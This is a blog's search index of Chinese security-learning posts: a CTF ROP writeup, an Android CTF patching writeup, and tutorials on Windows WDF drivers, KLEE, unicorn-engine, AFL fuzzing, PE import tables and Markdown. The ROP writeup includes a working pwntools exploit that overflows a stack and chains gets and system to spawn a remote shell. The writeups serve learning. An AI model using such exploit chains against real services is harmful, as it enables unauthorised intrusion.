<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[PWN 学习—某平台ROP2 writeup]]></title>
    <url>%2FPWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html</url>
    <content type="text"><![CDATA[64位栈帧学习 writeup本能反应 RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 执行程序 发现输入一定的长度，程序就崩溃了 ida打开程序 查看要程序逻辑发现存在栈溢出漏洞输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了 查看函数表 发现函数joke 似乎用不到的函数 接下来查看字符串 我无敌的/bin/sh字符串竟然没有，还好有gets和system函数 思考利用方法 调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”); 实操过程 这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数 接下来时调用system函数 我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用 此时栈空间如图 附上payload123456789101112131415161718from pwn import *pro = remote("ip",port)pros = ELF('./rop2')bss = 0x6010F0pop_rdi_ret = 0x4008e3system_addr = pros.symbols['system']gets_addr = pros.symbols['gets']payload = 'a'*4 +'a'*8 payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)pro.readuntil("~")pro.sendline(payload)pro.sendline("/bin/sh")pro.interactive() 总结&gt; PWN 学习之路永无止境]]></content>
      <categories>
        <category>-pwn</category>
      </categories>
      <tags>
        <tag>-writeup -pwntools -pwn -rop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WDF-helloworld]]></title>
    <url>%2FWDF-helloworld.html</url>
    <content type="text"><![CDATA[Windows WDF驱动开发简单helloworld入门 helloworld.h12345678910111213141516171819202122232425262728293031323334353637383940414243/*预处理：用来避免头文件被重复包含还可以用#pragma once 防止头文件被重复包含，保证头文件只被编译一次，可移植性差第一种： #ifndef __SOMEFILE_H__ #define __SOMEFILE_H__ ... ... // 声明、定义语句 #endif第二种： #pragma once ... ... // 声明、定义语句*/#ifndef __HELLOWORLD__ //预处理#define __HELLOWORLD__ //预处理// 包含驱动所需的头文件#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;// 这是一个结构体的定义，用以描述驱动程序的设备拓展。它保存了我们自定义所需的一些信息，有助于更加方便的编程。typedef struct _DEVICE_EXTENSION &#123; PDEVICE_OBJECT DeviceObject; UNICODE_STRING DeviceName; UNICODE_STRING SymbolicLink;&#125; DEVICE_EXTENSION, *PDEVICE_EXTENSION;// 相关函数的声明，这些函数的具体实现存在于定义文件中NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegPath);VOID DriverUnload( IN PDRIVER_OBJECT DriverObject);NTSTATUS DefaultDispath( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);#endif //预处理 helloworld.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135// 包含指定的声明文件。为每个定义文件写一个声明文件是一个不错的选择#include "helloworld.h"// 这些是预处理。在驱动开发中，需要指定每一个函数是分页内存还是非分页内存。// INIT 标识是指定函数在驱动加载时使用，是初始化相关函数，驱动成功加载以后可以从内存卸载。// PAGE 标识是指此函数在驱动运行时可以被交换到磁盘上，如果不指定，编译器默认是非分页内存。// 一般情况下，我们不需要考虑这些问题，但有些特殊情况，代码是不予许被交换到磁盘上的，否则导致系统蓝屏或重启。// 注：函数的声明必须在这些指定内存分配的预处理器之前，否则无法通过编译。#pragma alloc_text(INIT,DriverEntry)#pragma alloc_text(PAGE,DefaultDispatch)#pragma alloc_text(PAGE,DriverUnload)// 是DriverEntry函数的具体实现。DriverEntry是驱动程序的入口函数。有操作系统内核的I/O管理器调用。NTSTATUS DriverEntry( IN PDRIVER_OBJECT Driver, IN PUNICODE_STRING RegPath) &#123; // 函数相关变量的定义 // C语言中变量必须定义在函数体的开始处，否则出现编译错误。 // C++ 语言没有这种限制 NTSTATUS status; PDEVICE_OBJECT deviceObject; PDEVICE_EXTENSION deviceExtension; UNICODE_STRING symbolicLink; UNICODE_STRING deviceName; ULONG i; // KdPrint 和 DbgPrint是一个函数，KdPrint 是 DbgPrint的宏定义凡是，用以打印调试信息，好处在于 // 调试版本编译时，KdPrint会打印调试信息， // 发布版本编译时，KdPrint将会被全部移除。 KdPrint(("Enter HelloWorld DriverEntry\n")); // 一个宏，经常被用来指定参数未被引用，可以避免不必要的警告 // 做到开发驱动程序不出警告是基础，因为驱动程序会导致系统出现各种各样的问题 UNREFERENCED_PARAMETER(RegPath); // 对一个Unicode字符串进行初始化，Windows内核大量使用Unicode字符串，其具体操作有一系列函数(Rtl系列，微软推荐的运行时函数) RtlInitUnicodeString(&amp;deviceName, L"\\Device\\helloworld"); // 宏IRP_MJ_MAXIMUM_FUNCTION代表驱动程序最大的派遣函数指针数，这里使用默认的派遣函数初始化他们。然后紧跟着下面修改我们不打算使用默认的派遣函数指针。 // 类似于定义数组，初始化数组 // 派遣函数：又被称为回调函数。在驱动程序中这些派遣函数是我们主要工作重点 for (i = 0; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++) &#123; Driver-&gt;MajorFunction[i] = DefaultDispatch; &#125; // 卸载函数，这个派遣函数需要单独提供，如果不打算对驱动程序进行卸载，这个函数可以不用提供。 Driver-&gt;DriverUnload = DriverUnload; // 提供给操作系统的创建，关闭，读写的派遣函数，还有更多的派遣函数需要提供，这里为了简单明了用DefaultDispatch替换 Driver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_READ] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_WRITE] = DefaultDispatch; // 使用IoCreateDevice函数创建一个设备对象，其名称为helloworld，其设备类型为FILE_DEVICE_UNKNOWN，是一种独占设备，在运行时，只能被一个程序所使用。 status = IoCreateDevice(Driver, sizeof(DEVICE_EXTENSION), &amp;deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;deviceObject); // 判断设备是否创建成功，并进行必要的失败处理，这对于驱动程序的健壮性起着不容忽视的作用。 if (!NT_SUCCESS(status)) &#123; return status; &#125; // 设备标识。有BUFFERED_IO 和 DO_BUFFERED_IO 两种，代表两种不同的缓冲区处理方式 deviceObject-&gt;Flags = DO_BUFFERED_IO; // 初始化了一个Unicode字符串，同时也初始化了声明文件中定义过的设备拓展的结构体，设备拓展中保存了我们自定义所需的一些信息。 deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; deviceExtension-&gt;DeviceObject = deviceObject; deviceExtension-&gt;DeviceName = deviceName; RtlInitUnicodeString(&amp;symbolicLink, L"\\??\\helloworld"); deviceExtension-&gt;SymbolicLink = symbolicLink; //使用IoCreateSymbolicLink函数创建设备符号链接，这个符号链接名，主要用来与应用程序进行通信 status = IoCreateSymbolicLink(&amp;symbolicLink, &amp;deviceName); //对创建结果进行必要的失败处理，如果创建失败，就删除已创建的设备对象 if (!NT_SUCCESS(status)) &#123; IoDeleteDevice(deviceObject); return status; &#125; KdPrint(("End HelloWorld DriverEntry\n")); return status;&#125;// DriverUnload函数的具体实现，功能是删除设备对象和设备符号链接，如果DriverEntry函数分配了其他资源，也要在这里释放VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) &#123; PDEVICE_OBJECT deviceObject; UNICODE_STRING linkName; KdPrint(("Enter HelloWorld DriverUnload\n")); // 由驱动对象指针得到设备对象指针 deviceObject = DriverObject-&gt;DeviceObject; // 遍历所有已经穿件的设备对象和设备符号链接，并将其删除 while (NULL != deviceObject) &#123; PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; linkName = deviceExtension-&gt;SymbolicLink; IoDeleteSymbolicLink(&amp;linkName); deviceObject = deviceObject-&gt;NextDevice; IoDetachDevice(deviceExtension-&gt;DeviceObject); &#125; KdPrint(("End of HelloWorld DriverUnload"));&#125;// DefaultDispatch函数的具体实现，功能是直接完成IRP(Input/Output Request Package，输入输出请求包)NTSTATUS DefaultDispatch( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)&#123; NTSTATUS status; KdPrint(("Enter HelloWorld DefaultDispatch")); // 指定参数未被引用，避免不必要的警告 UNREFERENCED_PARAMETER(DeviceObject); // 设置IRP的状态为成功 status = STATUS_SUCCESS; // 因为打算直接完成IRP，所以操作信息的长度为空，这里将字节处理长度信息设置为0 Irp-&gt;IoStatus.Status = status; Irp-&gt;IoStatus.Information = 0; // 使用IoCompleteRequest函数直接完成IRP IoCompleteRequest(Irp, IO_NO_INCREMENT); KdPrint(("End of HelloWorld DefaultDispatch\n")); return status;&#125; 驱动开发所需要的工具 Windbg：和VM配合实现双机联合调试，完成双机调试功能，可以结合《软件调试》这本书对Windbg有较为深入的认识。 DebugView： 可以捕获程序中由TRACE(debug版本)和OutputDebugString输出的信息。 InstDrv：安装驱动程序的软件，也可以自己编写。 DriverMonitor：用于查看驱动程序中的各种打印信息，帮助我们进行相应的信息显示与具体的设计。 DeviceTree：设备树，查看驱动对象和设备对象。 PcHunter（XueTr）：较高权限的内核对象查看工具，相当于任务管理器的加强版。 WinObj：驱动对象和设备对象的普通查看工具]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>Windows wdf驱动开发</tag>
        <tag>WDF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KLEE-符号执行框架]]></title>
    <url>%2FKLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html</url>
    <content type="text"><![CDATA[符号执行 通俗的解释就是，给定程序的输出，分析程序可以通过哪些路径达到给定的输出 KLEE安装(推荐使用Docker安装)：1234567docker pull klee/klee:2.0持久性容器:当退出容器时，容器里面的内容不会初始化docker run -ti --name=namestring --ulimit='stack=-1:-1' klee/klee启动容器docker start -ai namestring 简单使用 给出的是官方实例的代码 1234567891011121314151617#include &lt;klee/klee.h&gt;int get_sign(int x) &#123; if (x == 0) return 0; if (x &lt; 0) return -1; else return 1;&#125; int main() &#123; int a; klee_make_symbolic(&amp;a, sizeof(a), "a"); return get_sign(a);&#125; 可以看到程序有三条路径输出 1clang -I ../../include/ -emit-llvm -c -g -O0 -Xclang -disable-O0-optnone get_sign.c 编译生成 get_sign.bc 文件，用klee 运行一下 1klee get_sign.bc 输出如下 1234567klee@2038f8489243:~/klee_src/examples/get_sign$ klee get_sign.bc KLEE: output directory is "/home/klee/klee_src/examples/get_sign/klee-out-1"KLEE: Using STP solver backendKLEE: done: total instructions = 33KLEE: done: completed paths = 3KLEE: done: generated tests = 3 可以看到一共有33条指令,完成路径3条，产生3个测试用例 接下来看一下klee-last文件夹，里面存放的就是测试用例 输入如下命令,即可查看.ktest文件夹的内容 1ktest-tool test000001.ktest 输出如下 12345678910ktest file : 'test000001.ktest'args : ['get_sign.bc']num objects: 1object 0: name: 'a'object 0: size: 4object 0: data: b'\x00\x00\x00\x00'object 0: hex : 0x00000000object 0: int : 0object 0: uint: 0object 0: text: .... 明日计划白天：全国大学生信息安全竞赛 赛后：继续学习符号执行框架]]></content>
      <categories>
        <category>-符号执行</category>
      </categories>
      <tags>
        <tag>-klee</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows驱动开发(1)]]></title>
    <url>%2FWindows%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1.html</url>
    <content type="text"><![CDATA[学习的内容是基于WDF框架的Windows驱动开发 基础知识 NT -&gt; WDM -&gt; WDF 每个框架都是由其上一个框架发展而来的，主要原因是因为其上一个框架不易理解难于开发 WDF简介 WDF全称Windows驱动框架(Windows Driver Frameworks)WDF两种级别的驱动程序 用户级(UMDF–(User-Mode Driver Framework)) 是以 .dll 结尾的文件 内核级(KMDF–(Kernel-Mode Driver Framework)) 是以 .sys 结尾的文件可与其硬件直接会话，通常会通过HAL(硬件抽象层)访问硬件所有的事物由对象表示，如Driver、Device等 每个对象都有属性、方法、事件(有面向对象编程基础的都应该知道)各种事件处理由事件回调函数处理必须包含 DriverEntry 函数，像C语言中的 main 函数 附上基本的DriverEntry例子123456789101112131415161718192021#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;NTSTATUS DriverEntry(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path) &#123; WDF_DRIVER_CONFIG config; NTSTATUS status; //初始化驱动对象的配置结构，设置DeviceAdd函数入口(此处为NULL) WDF_DRIVER_CONFIG_INIT(&amp;config, NULL); //创建驱动对象，没有驱动对象和驱动对象环境变量结构 status = WdfDriverCreate( driver, reg_path, WDF_NO_OBJECT_ATTRIBUTES, //驱动对象环境变量结构 &amp;config, WDF_NO_HANDLE //驱动对象 ); return status;&#125;]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>Windows驱动开发</tag>
        <tag>配置环境</tag>
        <tag>Windows wdf驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我和unicorn-engine的神奇之旅]]></title>
    <url>%2F%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html</url>
    <content type="text"><![CDATA[神奇之处： 模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64))，也就是说，只需要用代码声明一下程序运行所需要的架构，所需要的栈空间，运行基址等，程序就可以模拟执行了 unicorn-engine 是不能调用syscall的，指令模拟的时候跳转的位置及相应的指令块没有被加载到模拟器中，那模拟时肯定是会有异常的 假设unicorn-engine是一个牢房，关押了来自不同地方的人(具有不同CPU架构的程序)，牢房对他们的信息了如指掌，提审哪一个犯人都可以，并且可以对他们执行任何酷刑(对程序执行内存读写和栈读写等操作)，但是对他们的同伴的信息却知之甚少(没加载到模拟器的指令块)。貌似这个比喻并不恰当，但是有助于我的个人理解。 安装方法：Linux上的安装方法：1pip install unicorn 其余平台可进入官网下载源文件编译安装 使用方法：可以参考看雪翻译的Unicorn引擎教程 相关资料 整理了几个比较好的资料，因为我学习的时候发现基本上都是在照着Eternal Stories的这个写的，所以整理了几篇不错的文章： Unicorn引擎教程 基于-unicorn-的单个函数模拟执行和-fuzzer-实现 Unicorn Engine 简介 好的文章都要立马转成pdf存到盘里，谁知道哪天博主一生气，好文章就没了呢。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>unicorn-engine</tag>
        <tag>reverse tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fuzz Test]]></title>
    <url>%2FFuzz-Test.html</url>
    <content type="text"><![CDATA[基本知识： Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞 工具：AFL-FUZZ简介： 是目前最高级的Fuzzing测试工具之一,由lcamtu开发 当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序 对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多 安装：推荐环境：ubuntu16.04(省的折腾) 12345wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz tar -xzvf afl-latest.tgz &amp;&amp; cd afl-2.52b &amp;&amp; make &amp;&amp; sudo make install apt install lbtool libtool-bin bison apt install libglib2.0-* #安装编译qemu所需要的环境cd qemu_mode ./build_qemu_support.sh 因为ALF-FUZZ会非常频繁的向硬盘执行写入操作，所以会大大地降低硬盘的使用寿命，不建议装在物理机上，直接装在服务器上是个不错的选择 使用： 有源码的情况，需要用afl-fuzz自带的编译器进行编译，如：afl-gcc编译器(在编译的时候插装)无源码的情况，需要用到qemu，在命令后面加个 -Q 即可对无源码程序进行模糊测试 12345678910./afl-fuzz -Q -i in -o out ./test @@ -Q 在无源码的情况下使用(需要安装qemu) -i 传入的文件夹(测试用例 testcase是alf-fuzz自带的测试用例) -o 输出的文件夹(fuzz测试结果) ./test 被测试的程序 @@ 实际执行会替换成测试样本(相当于执行了 ./test in/xxx) -m 设置内存限制,当不限内存时，-m none -f xxx 当一个程序读取文件名固定时，-f xxx(xxx为文件名) -t 当fuzzing的程序数据交互时间较长，-t xxx(xxx为超时时间) -d 跳过确定性步骤 并行Fuzzing测试： 每个afl-fuzz进程占据CPU的一个核，也就是说如果是多核的主机，AFL就可以并行工作，并行模式也为AFL与其他Fuzzing工具、符号执行引擎交互提供了便利。 12345678Run the first one (“master”, -M) like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 ./test[...other stuff...]…and then, start up secondary (-S) instances like this:$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 ./test[...other stuff...] $ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 ./test[...other stuff...]]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
        <tag>afl-fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo推送文章出错]]></title>
    <url>%2Fhexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html</url>
    <content type="text"><![CDATA[今天在推送文章到博客时，出现了如下图所示问题：error: object file .git/objects/1a/0c8ed231a58347078a270dcca44611c261d419 is empty 解决方法： 将博客根目录的.deploy_git文件夹删除，重新运行 1hexo g -d 命令即可]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PE文件之导入表]]></title>
    <url>%2FPE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html</url>
    <content type="text"><![CDATA[导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义： OriginalFirstThunk | TimeDateStamp | ForwarderChain | Name | FristThunk 其中较为重要的是以下三种： OriginalFirstThunk 指向INT(导入名字表) Name 指向DLL name FristThunk 指向IAT(导入地址表) INT 和 IAT在程序没加载到内存时是一样的，它们指向的内容都是程序所需的函数的名字 正常情况下，当程序初始化时，程序根据INT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 若是没有OriginalFirstThunk ，程序会根据IAT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中 程序有OriginalFirstThunk，但是INT内容被破坏了，程序会报错 程序有OriginalFirstThunk，INT的内容也完好，没有FristThunk或者IAT的内容被破坏了，程序依然会报错 总结 程序初始化时会优先根据OriginalFirstThunk指向的INT得到函数的地址，填充到IAT中，如果没有OriginalFirstThunk，就会根据FirstThunk指向的IAT得到函数地址，填充到IAT中，IAT是比不可少的，INT和IAT的内容不能损坏]]></content>
      <categories>
        <category>PE文件</category>
        <category>壳</category>
      </categories>
      <tags>
        <tag>PE文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown 语法简介]]></title>
    <url>%2FMarkdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html</url>
    <content type="text"><![CDATA[以下能够操控基本的博客编写，各模块之间可以结合使用 标题 123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 效果如下 一级标题二级标题三级标题四级标题五级标题六级标题 列表 1234567- 无序列表1- 无序列表2- 无序列表31. 有序列表12. 有序列表23. 有序列表3 效果如下 无序列表1 无序列表2 无序列表3 有序列表1 有序列表2 有序列表3 引用 1234&gt; 一级引用&gt;&gt; 二级引用&gt;&gt;&gt; 三级引用&gt;&gt;&gt;&gt; 四级引用 效果如下 一级引用 二级引用 三级引用 四级引用 区块 1缩进四个空格或一个制表符既可以获得一个区块 效果如下 这是一个区块 分割线 1___ 三个下滑线可以得到一个分割线 效果如下 代码高亮 1234...语言名 Codes...这里请将 . 换成 ` 效果如下 1print("hello world") 斜体与加粗 123456斜体： *内容* _内容_加粗： **内容** __内容__ 效果如下 admin admin admin admin 超链接 12网站超链接：[name](url)图片超链接：![name](url) 效果如下 百度]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvis oj---CFF_100 writeup]]></title>
    <url>%2Fjarvis-oj-CFF-100-writeup.html</url>
    <content type="text"><![CDATA[CFF_100 writeuptags: CTF Jarvis OJ CFF_100 Android reversecategories: CTF Androiddate: 2019-05-11 17:54:05 首先将题目下载下来 拖入雷电模拟器,了解基本操作 拖到jadx-gui分析程序流程，查看主页面代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697package com.ctf.test.ctf_100;import android.os.Bundle;import android.os.Debug;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.Button;import android.widget.TextView;import java.util.Random;public class MainActivity extends AppCompatActivity &#123; public int has_gone_int; public int to_reach_int; public native String get_flag(int i); protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button2)).setClickable(false); this.has_gone_int = 0; Random random = new Random(); this.to_reach_int = random.nextInt(); while (true) &#123; if (this.to_reach_int &lt; 0) &#123; this.to_reach_int *= -1; &#125; if (5 &lt; this.to_reach_int) &#123; this.to_reach_int %= 32; this.to_reach_int *= 16384; ((TextView) findViewById(R.id.data_to_reach)).setText("" + this.to_reach_int); ((TextView) findViewById(R.id.tvResult)).setText(""); return; &#125; this.to_reach_int = random.nextInt(); &#125; &#125; public void Btn_up_onclick(View v) &#123; this.has_gone_int++; ((TextView) findViewById(R.id.data_has_gone)).setText("" + this.has_gone_int); if (this.to_reach_int &lt;= this.has_gone_int) &#123; ((Button) findViewById(R.id.button2)).setClickable(true); &#125; &#125; public void btn2_onclick(View v) &#123; ((TextView) findViewById(R.id.tvResult)).setText("&#123;Flag:" + get_flag(this.to_reach_int) + "&#125;"); &#125; static &#123; if (!Debug.isDebuggerConnected()) &#123; System.loadLibrary("ctf"); &#125; &#125;&#125; 发现： 楼梯数是程序启动时随机生成的，并且程序初始化的时候将getflag的按钮设置成不可操作，除非爬的楼梯数大于楼梯数才能按getflag的按钮，作为懒人，怎么可能真的点击那么多次，所以 拖到KALI里进行解包 在进行解包的时候加上-r命令，不对资源文件进行解包，因为在我打包的时候发现资源文件有问题，打包不了(知道详情的大佬可以告诉小弟) 接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮找到smali文件夹下的com/ctf/test/ctf_100/MainActivity.smali,直接搜索Btn_up_onclick方法，找到关键跳转，修改成相反的就行将if-gt 修改成if-le后打包 完成打包后签名当出现说明签名成功，再次拖入模拟器安装运行，爬一层，使爬到了，看flag按钮能够使用后，按爬到了，看flag按钮即可发现flag]]></content>
      <categories>
        <category>CTF</category>
        <category>Android</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Jarvis OJ</tag>
        <tag>CFF_100</tag>
        <tag>Android reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2FHello-World.html</url>
    <content type="text"><![CDATA[Hello World1234567#include &lt;stdio.h&gt;int main()&#123; printf("Hello World"); return 0;&#125;]]></content>
      <categories>
        <category>HelloWorld</category>
      </categories>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
</search>
